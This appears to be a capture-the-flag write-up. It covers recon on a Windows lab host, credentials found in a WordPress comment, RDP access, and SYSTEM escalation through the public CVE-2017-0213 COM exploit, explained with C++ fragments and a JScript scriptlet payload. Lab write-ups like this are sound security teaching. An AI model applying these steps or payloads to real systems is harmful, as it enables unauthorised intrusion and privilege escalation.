# Topics

- Nmap enumeration
- Directory fuzzing with ffuf
- WordPress recon
- Credential harvesting from public posts
- RDP access
-  Windows privilege escalation via CVE-2017-0213

# Recon

There are two open ports. Port 80 sets up a HTTP web server and port 3389 is for RDP. The RDP port will be important for later.
## nmap

```bash
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:..............
```

The default page doesn't have anything interesting, so let's fuzz for directories.
## ffuf

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.65.157.240/FUZZ
 :: Wordlist         : FUZZ: /SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

retro                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 213ms]
```

With ffuf we found the /retro directory.  Now we write the URL http://{ip}/retro/  and it shows a WordPress blog.
## WPScan

The blog is running WordPress and has a single user posting everything, someone called Wade. Going through the posts, one of them has something interesting in the comments section. Wade left a comment that looks like a note to himself

That's the password sitting in plain sight. Combined with the username we already found, we now have

```
wade:parzival
```

I tried logging into the WordPress admin panel (/retro/wp-admin) with these creds and it worked, but there's to much to do from there directly. 

The log shows an outdated WordPress with 66 known vulns, but none of them ended up being the path forward here. The creds we found manually were the real find.
```bash
[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.65.157.240/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://10.65.157.240/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |
 | [!] 66 vulnerabilities identified:
 |
```

## RDP

```bash
~> xfreerdp3 /u:wade /v:10.65.157.240
```


The user.txt flag is sitting right on the desktop.

# CVE-2017-0213

Now we need to go from wade to SYSTEM.

## Explanation
A local privilege escalation in Windows COM infrastructure. The bug lives in how Windows handles COM object activation when an unprivileged user tries to instantiate a COM server that requires elevation. By abusing the marshaling mechanism, an attacker can get code running as SYSTEM or a higher-integrity process.

Affects Windows 7 through Windows 10 / Server 2016 (pre-May 2017 patch).

When a low-integrity process requests a COM object that requires a higher-integrity server, Windows uses COM Aggregate Marshaling to proxy the request. The vulnerability is that the marshaling code doesn't properly validate the object before unmarshaling it in the elevated context, allowing a crafted COM object to hijack the elevated instantiation flow.

In short: you register a malicious COM server, trick the elevated COM infrastructure into unmarshaling it, and get code execution in that elevated context.

You can just download and execute this exploit in the windows server, but if you wanna learn something new i will explain the exploit for you

```bash
# download from https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip

unzip CVE-2017-0213_x64.zip

cd CVE-2017-0213_x64

python3 -m http.server 8080
```

#  How does the POC works

Before diving into code. this exploit abuses how Windows handles COM objects talking between processes. The target is the BITS service (runs as SYSTEM). The full chain looks like this:


1. Lie to COM about what interface we are
2. BITS impersonates us and calls QI on our object
3. Gets back the wrong interface → tries to build an automation proxy for it
4. To do that, loads a type library DLL we control
5. That TLB has a moniker pointing to a scriptlet → arbitrary code as SYSTEM

## Step 1: The fake object

The PoC creates a fake COM object that pretends to be a BITS callback (IBackgroundCopyCallback2). Normal enough so far. The trick is in QueryInterface when someone asks "are you ITMediaControl?" (a completely unrelated TAPI interface), it says yes and returns itself:

```cpp
else if (riid == IID_ITMediaControl)
{
    *ppvObj = static_cast<IPersist*>(this);
}
```

This object isn't ITMediaControl. The vtable layout is completely different. That mismatch is what causes the chaos later.
## Step 2: The custom marshaler 

When COM sends our object to BITS (cross-process), it serializes it through MarshalInterface. This is where the IID swap happens:

```cpp
if (iid == __uuidof(IBackgroundCopyCallback2))
{
    iid = IID_ITMediaControl; // swap the IID in the stream
}
CoMarshalInterface(pStm, iid, _unk, ...);
```

BITS asks for IBackgroundCopyCallback2. But the serialized stream says the object is ITMediaControl. When BITS deserializes it, it just trusts whatever IID is in the stream, it doesn't check that it matches what was requested. That's literally the bug. No validation.

We also return CLSID_AggStdMarshal2 as our unmarshal class:

```cpp
*pCid = CLSID_AggStdMarshal2;
```

This forces COM to use RemQueryInterface2 on the receiving end instead of the normal RemQueryInterface. RQI2 passes back full OBJREF structures, and it's exactly that code path that skips the IID validation. Without this, the type confusion doesn't trigger.
## Step 3: Redirecting the C: drive

While the SetNotifyInterface call is in flight, the PoC redirects its own C: drive to its working directory:

```cpp
ScopedHandle link = CreateSymlink(L"\\??\\C:", GetCurrentPath());
pJob->SetNotifyInterface(pNotify); // call happens while redirect is active
```

Windows gives every process its own DOS device map, so you can redirect \??\C: without touching anyone else's. No elevation needed.

When BITS receives the type-confused object and tries to build an automation proxy for ITMediaControl, it needs to load the type library for that interface, which lives at C:\Windows\System32\tapi3.dll. But BITS is currently impersonating us, so it resolves C: through our redirected device map. It ends up loading our fake tapi3.dll from our own directory instead.
## Step 4: The malicious type library

Type libraries (TLBs) can reference other type libraries by filename instead of embedding the type definitions directly. When the loader tries to resolve a referenced TLB by name and can't find a real file, it falls back to parsing the string as a moniker.

The PoC builds a crafted TLB which has a reference pointing to `script:C:\path\to\run.sct` instead of a real file path:

```cpp
// Build intermediate TLB with placeholder filename (same length as moniker)
bstr_t buf = GetExeDir() + L"\\";
for (unsigned int i = 0; i < len; ++i) buf += L"A"; // AAAA...

// Then patch the binary, replacing AAAA... with the actual scriptlet moniker
memcpy(&tlb_data[i], script_path, len);

// Drop it where BITS will find it
WriteFile(GetExeDir() + L"\\Windows\\system32\\tapi3.dll", tlb_data);
```

The length trick is necessary because TLB is a binary format and you can't just insert bytes, you need the replacement string to be exactly the same length as the placeholder.
## Step 5: The scriptlet

When LoadTypeLib tries to walk the inheritance chain of  ITMediaControl and hits the broken reference, it binds the scriptlet moniker. The scriptlet is just XML with embedded JScript:

```xml
<?xml version='1.0'?>
<package>
<component id='giffile'>
<script language='JScript'>
<![CDATA[
  new ActiveXObject('Wscript.Shell').exec('C:/path/to/exploit.exe 1');
]]>
</script>
</component>
</package>
```

This runs inside the BITS process, which is SYSTEM. The payload calls CreateProcessAsUser to spawn cmd.exe on the current desktop with the BITS token, giving you a SYSTEM shell.
